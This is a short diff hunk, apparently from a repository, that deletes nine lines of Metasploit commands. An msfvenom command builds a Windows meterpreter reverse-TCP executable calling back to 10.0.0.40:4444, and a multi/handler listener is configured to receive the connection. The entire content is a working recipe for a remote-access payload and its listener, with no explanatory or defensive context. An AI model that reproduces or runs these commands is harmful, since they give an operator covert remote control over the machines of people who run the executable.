@@ -1,9 +1,0 @@
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.40 LPORT=4444 --format=exe > _m40.exe
-
-use exploit/multi/handler
-
-set payload windows/meterpreter/reverse_tcp
-set lhost eth0
-set lport 4444
-
-
